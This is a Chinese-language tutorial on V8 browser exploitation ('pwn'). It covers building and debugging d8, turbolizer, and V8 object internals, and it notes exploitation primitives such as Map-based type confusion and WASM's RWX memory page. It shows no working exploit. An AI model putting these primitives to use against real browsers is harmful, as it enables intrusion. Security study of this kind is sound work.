<li><p><code>Webkit</code>(safari)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/5a2c7bb9ed7f645604659956c9140f12.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul>
<li><a class="link"   href="https://www.blackhat.com/" >漏洞网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://source.chromium.org/" >源码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="ubuntu-18-04"><a href="#ubuntu-18-04" class="headerlink" title="ubuntu 18.04"></a>ubuntu 18.04</h2><h3 id="编译-v8"><a href="#编译-v8" class="headerlink" title="编译 v8"></a>编译 v8</h3><p>首先下载用于 <code>Chromium</code> 开发的工具 <code>depot_tools</code> 。这个工具用于 <code>v8</code> 的编译。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure></div>

<p>将 <code>depot_tools</code> 添加到环境变量 <code>PATH</code> 的末尾</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br></pre></td></tr></table></figure></div>

<p>挂好代理，进入到 <code>depot_tools</code> 。直接安装会 <code>ninja</code> 报错需要先将版本回退到 <code>138bff28</code>** 并且将 <code>DEPOT_TOOLS_UPDATE</code> 设为 0 。之后更新 <code>depot_tools</code> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard 138bff28</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div>

<p>出现以下界⾯说明更新成功<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/076214d58c9f667947cff193c11a4953.png"
                      alt="在这里插入图片描述"
                ><br>下载 <code>v8</code>，这个时间比较长，下载完后目录下会多一个 <code>v8</code> 文件夹。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure></div>

<p>出现如下报错是因为之前 fetch 过，<code>depot_tools</code> 有相关记录，需要添加 <code>--force</code> 参数强制下载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch --force v8</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2d9e60b57c9b91542e571dad74d9e54e.png"
                      alt="在这里插入图片描述"
                ></p>
<p>根据题目需求 <code>git checkout</code> 切换 <code>v8</code> 版本，然后 <code>gclient sync -D</code> 下载相关依赖，<code>-D</code> 会删除不需要的依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd v8</span><br><span class="line">git checkout  7.6.303.28</span><br><span class="line">gclient sync -D</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>gclient sync</code> 出现如下报错则尝试下面这条命令（<del>貌似也不太行</del> ）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gclient config https://chromium.googlesource.com/v8/v8</span><br></pre></td></tr></table></figure></div>

<p>其实这个报错很有可能是修改了 <code>v8</code> 文件夹名称或移动目录导致的，因为每次 <code>fetch v8</code> 在 <code>depot_tools</code> 中都会有相关的记录，<code>sync</code> 需要这些记录 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a9e1104bf1f94c6b840269b8dd3100b5.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><p>如果题目给的是一个 Chrome 浏览器那么首先安装浏览器然后再网址栏中输入 <code>chrome://version</code> 查看版本，例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">112.0.5615.87 (正式版本) （64 位） (cohort: Bypass) </span><br></pre></td></tr></table></figure></div>

<p>打开 github 的 <a class="link"   href="https://github.com/chromium/chromium" >chrome <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 项目，搜索版本号并切换至相应版本。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7478b65db9045f2215b821e9a1e2267f.png"
                      alt="在这里插入图片描述"
                ><br>然后在项目根目录下的 <code>DEPS</code> 文件中查看 <code>V8</code> 版本：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/aae0870ac00cce5722ced9f43d894b24.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>如果题目给了 <code>diff</code> 文件需要将 patch 到项目中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git apply ./oob.diff</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>之后安装相关依赖，如果遇到下载字体未响应问题需要添加 <code>--no-chromeos-fonts</code> 参数。（每次换版本都要运行，否则 gdb 插件的 job 功能不正常）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure></div>

<p>编译 <code>v8</code> ，这里选的 <code>release</code> 版本。<code>debug</code> 版本改为 <code>x64.debug</code> ，32 为版本将 <code>x64</code> 改为 <code>ia32</code> 。如果调试漏洞的话, 最好选择 <code>release</code> 版本 因为 <code>debug</code> 版本可能会有很多检查。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>另外如果出现路径错误需要切换到 <code>./tools/dev/</code> 路径再进行编译。不过这样编译最终生成的 <code>d8</code> 在 <code>tools/dev/out/x64.release</code> 目录下。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a1051554575e9c61f1d78692a54147f7.png"
                      alt="在这里插入图片描述"
                ><br>完成后是这个样子<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/cfe38b05694d9aeba1e2732c7f9566db.png"
                      alt="在这里插入图片描述"
                ><br>出现这个错误是因为 <code>out</code> 目录下的 <code>x64.release</code> 文件夹没有删。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2a1d0f71ecf94af51fcd70c0ff475d20.png"
                      alt="在这里插入图片描述"
                ></p>
<p>编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3ae53b580f94b64b7d4b3c08b2c4b409.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="调试-v8"><a href="#调试-v8" class="headerlink" title="调试 v8"></a>调试 v8</h3><p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">source /path/to/v8/tools/gdbinit</span><br><span class="line">source /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure></div>

<p>常见参数：</p>
<ul>
<li><code>--allow-natives-syntax</code> 开启原生API (用的比较多)</li>
<li><code>--trace-turbo</code> 跟踪生成TurboFan IR</li>
<li><code>--print-bytecode</code> 打印生成的bytecode</li>
<li><code>--shell</code> 运行脚本后切入交互模式</li>
<li>更多参数可以参考 <code>--help</code></li>
</ul>
<p>调试 js 脚本时可以采用如下命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./d8</span><br><span class="line">r --allow-natives-syntax --shell ./exp.js</span><br></pre></td></tr></table></figure></div>

<p>js中常见的⼀些调试技巧：</p>
<ul>
<li>在js中写⼊断点：<code>%SystemBreak();</code> ，如果不在调试模式的话, 程序直接中断, 如果在调试器中, 会被调试器识别到<br>并且断下来。</li>
<li>打印出对象的地址和对应的信息: <code>%DebugPrint(var_name);</code></li>
<li>调试时输入 <code>job + DebugPrint打印的对象地址</code> 可以打印出对象的结构。</li>
</ul>
<h3 id="安装-turbolizer"><a href="#安装-turbolizer" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><p><code>turbolizer</code> 是一个可视化分析 JS 优化的工具，安装命令如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n 16.20.0 # sudo n latest</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div>

<p>由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装 <code>16.20.0</code> 版本。另外 <code>sudo npm i</code> 如果成功结果如下图：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6abb1619281f83f884e392cd9bb9b40d.png"
                      alt="在这里插入图片描述"
                ></p>
<p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></div>

<p>编写一个 js 脚本：<br><code>%OptimizeFunctionOnNextCall</code> 内置函数可以直接触发强行触发优化。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%OptimizeFunctionOnNextCall(add);</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">add</span>(i, i + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./d8 --trace-turbo --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure></div>

<p>此时会生成如下文件：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d6c28ea4d12dd171e9d98e68da5b328f.png"
                      alt="在这里插入图片描述"
                ><br>在浏览器（<strong>最好使用 Chrome 浏览器，系统自带的火狐浏览器可能有问题。</strong>）中访问 <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code>（注意，这里的路径是相对于 python 启动的 web 服务的路径的相对路径而不是绝对路径） ，然后在其中打开该文件就可以进行分析。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4c5ccd404575542afecdabd6829685b5.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="ubuntu-20-04-及以上（推荐）"><a href="#ubuntu-20-04-及以上（推荐）" class="headerlink" title="ubuntu 20.04 及以上（推荐）"></a>ubuntu 20.04 及以上（推荐）</h2><h3 id="编译-v8-1"><a href="#编译-v8-1" class="headerlink" title="编译 v8"></a>编译 v8</h3><p>下载 <code>depot_tools</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=$PATH:&lt;path to depot_tools&gt;</span><br><span class="line">cd depot_tools</span><br><span class="line">gclient</span><br></pre></td></tr></table></figure></div>
<p>下载、编译 v8</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">gclient sync -D</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>注意要确保 <code>ninja-build</code> 已安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt install ninja-build</span><br></pre></td></tr></table></figure></div>
<h3 id="安装-turbolizer-1"><a href="#安装-turbolizer-1" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">sudo npm install -g npm # 升级 npm 到最新版</span><br><span class="line">cd /path/to/v8/tools/turbolizer</span><br><span class="line">sudo npm install n -g</span><br><span class="line">sudo n latest # 升级 nodejs 到最新版</span><br><span class="line">sudo npm i</span><br><span class="line">sudo npm run-script build</span><br></pre></td></tr></table></figure></div>
<h1 id="浏览器利用常用的class"><a href="#浏览器利用常用的class" class="headerlink" title="浏览器利用常用的class"></a>浏览器利用常用的class</h1><h2 id="数组-Array"><a href="#数组-Array" class="headerlink" title="数组 Array"></a>数组 Array</h2><ul>
<li>数组是JS最常用的class之一，它可以存放任意类型的js object。</li>
<li>有一个 <code>length</code> 属性，可以通过下标来线性访问它的每一个元素。</li>
<li>有许多可以修改元素的接口。</li>
<li>当元素为object时，只保留指针。</li>
</ul>
<h2 id="ArrayBuffer-和-DataView"><a href="#ArrayBuffer-和-DataView" class="headerlink" title="ArrayBuffer 和 DataView"></a>ArrayBuffer 和 DataView</h2><h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p><code>ArrayBuffer</code> 对象用来表示通用的、固定长度的原始二进制数据缓冲区。<code>ArrayBuffer</code> 不能直接操作，而是要通过类型数组对象或 <code>DataView</code> 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(length)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>参数</p>
<ul>
<li><code>length</code> 要创建的 <code>ArrayBuffer</code> 的大小，单位为字节。</li>
</ul>
</li>
<li><p>返回值：一个指定大小的 <code>ArrayBuffer</code> 对象，其内容被初始化为 <code>0</code> 。</p>
</li>
</ul>
<h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><p> <code>DataView</code> 是一个可以从 <code>ArrayBuffer</code> 对象中读写多种数值类型的底层接口，使用它时，不用考虑不同平台的字节序问题。</p>
<ul>
<li><p>语法</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DataView</span>(buffer [, byteOffset [, byteLength]])</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>参数</p>
<ul>
<li><code>buffer</code>：一个 <code>ArrayBuffer</code> 或 <code>SharedArrayBuffer</code>  对象，<code>DataView</code> 对象的数据源。</li>
<li><code>byteOffset</code>（可选）：此 <code>DataView</code> 对象的第一个字节在 <code>buffer</code> 中的偏移。如果未指定，则默认从第一个字节开始。</li>
<li><code>byteLength</code>（可选）：此 <code>DataView</code> 对象的字节长度。如果未指定，则默认与 <code>buffer</code> 的长度相同。</li>
</ul>
</li>
<li><p>返回值：一个 <code>DataView</code> 对象，用于呈现指定的缓存区数据。你可以把返回的对象想象成一个二进制 <code>array buffer</code> 的“解释器”——它知道如何在读取或写入时正确地转换字节码。这意味着它能在二进制层面处理整数与浮点转化、字节顺序等其他有关的细节问题。</p>
</li>
</ul>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>例如下面这段代码</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab);</span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, <span class="number">0xdeadbeef</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dv.<span class="title function_">getUint16</span>(<span class="number">2</span>, <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(dv);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>这段代码输出结果是 57005 ，即 0xdead 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c73ed9e6cf4d28ded671bc1c1e9338fb.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="WASM（WebAssembly）"><a href="#WASM（WebAssembly）" class="headerlink" title="WASM（WebAssembly）"></a>WASM（WebAssembly）</h2><ul>
<li><p>顾名思义，是Asm on the web 。但其实不是真正意义上的汇编，只是更加接近汇编。</p>
</li>
<li><p>常用接口有</p>
<ul>
<li><code>WebAssembly.Module()</code>：创建一个新的 WebAssembly 模块对象。</li>
<li><code>WebAssembly.Instance()</code>：创建一个新的 WebAssembly 实例对象。</li>
<li><code>WebAssembly.Memory()</code>：创建一个新的 WebAssembly 内存对象。</li>
<li><code>WebAssembly.Table()</code>：创建一个新的 WebAssembly 表格对象。</li>
</ul>
</li>
<li><p>最重要的特点：可以在 Javascript Engine 的地址空间中导入一块可读可写可执行的内存页。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/1183634adb9db86c2a83a979abe4d505.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<h1 id="V8-的-object-通用结构"><a href="#V8-的-object-通用结构" class="headerlink" title="V8 的 object 通用结构"></a>V8 的 object 通用结构</h1><ul>
<li><code>Object</code> 可以拥有任意属性</li>
<li>属性名可以是数字和字母的组合</li>
<li>名字为数字的属性被称作 <code>element</code> ，其他的被称作 <code>property</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/593f5ca0dd5af835b2cc59a27f0c560d.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h2 id="Hidden-Class-Map"><a href="#Hidden-Class-Map" class="headerlink" title="Hidden Class (Map)"></a>Hidden Class (Map)</h2><p><code>Hidden Class</code> 也被称作 <code>Object Map</code>，简称 <code>Map</code>。位于 <code>V8 Object</code> 的第一个 8 字节。<br>任何由 <code>v8 gc</code> 管理的 <code>Js Object</code> ，它的前 8 个字节（或者在 32 位上是前四个字节）都是⼀个指向 <code>Map</code> 的指针。<br><code>Map</code> 中比较重要的字段是一个指向 <code>DescriptorArray</code> 的指针，里面包含有关name properties的信息，例如属性名和存储属性值的位置。<br>具有相同 <code>Map</code> 的两个 <code>JS object</code> ，就代表具有相同的类型（即具有以相同顺序命名的相同属性），比较 <code>Map</code> 的地址即可确定类型是否⼀致，同理，替换掉 <code>Map</code> 就可以进行类型混淆。</p>
<p><strong>在一些利用中，可以通过伪造 <code>Type</code> 字段来伪造 <code>Map</code> 。</strong></p>
<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p><code>Properties</code> 用于保持非数字索引的属性，分为 <code>Inline Property</code> ，<code>Fast Properties</code> 和 <code>Dictionary Properties</code> 。</p>
<h3 id="Inline-Property"><a href="#Inline-Property" class="headerlink" title="Inline Property"></a>Inline Property</h3><p>即 <code>in-object proterty</code> ，存放在 <code>object</code> 本身，而不是在 <code>Properties</code> 指针指向的内存，需要 <code>Descriptor Array</code> 。</p>
<h3 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h3><p><code>Fast Properties</code> 线性保存在 <code>Properties</code> 指针指向的内存中，需要 <code>Descriptor Array</code> 。</p>
<h3 id="Dictionary-Properties"><a href="#Dictionary-Properties" class="headerlink" title="Dictionary Properties"></a>Dictionary Properties</h3><p><code>Dictionary Properties</code> 即 <code>Slow Properties</code>，以哈希表的形式保存在 <code>Properties</code> 指针指向的内存中，不需要  <code>Descriptor Array</code> 。</p>
<h2 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h2><p><code>Elements</code> 用于保存数字索引的属性。</p>
<h3 id="Packed-Elements-Holey-Elements"><a href="#Packed-Elements-Holey-Elements" class="headerlink" title="Packed Elements &amp; Holey Elements"></a>Packed Elements &amp; Holey Elements</h3><p>如果各个属性之间连续，那么可以直接开一个数组（下标从 0 开始）来表示 <code>Elements</code>，如果有的下标没有对应的属性则数组中该下标对应的值为一个特殊值，此时这个 <code>Elements</code> 被称为 <code>Holey Elements</code> 。如果数组中每个下标都对应属性则这个 <code>Elements</code> 被称为 <code>Packed Elements</code> 。</p>
<p>例如下面这个脚本：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line">a.<span class="property">__proto__</span> = &#123;<span class="number">1</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">2</span>: <span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">0</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">1</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">2</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a[<span class="number">3</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>调试结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x37815f38bba9 &lt;JSArray[3]&gt;</span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c3069 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bb21 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c7571 &lt;String[#1]: b&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446c30b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1b0fcc0517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x37815f38bba9</span><br><span class="line">0x37815f38bba9: [JSArray]</span><br><span class="line"> - map: 0x39d6446ca599 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x37815f38bbf1 &lt;Object map = 0x39d6446ca639&gt;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x010c0d5c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x247fa62001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37815f38bbc9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x010c0d5c74b1 &lt;String[#1]: a&gt;</span><br><span class="line">           1: 0x010c0d5c05b1 &lt;the_hole&gt;</span><br><span class="line">           2: 0x1b0fcc05f4f9 &lt;String[#1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x37815f38bbf1</span><br><span class="line">0x37815f38bbf1: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x39d6446ca639 &lt;Map(HOLEY_ELEMENTS)&gt; 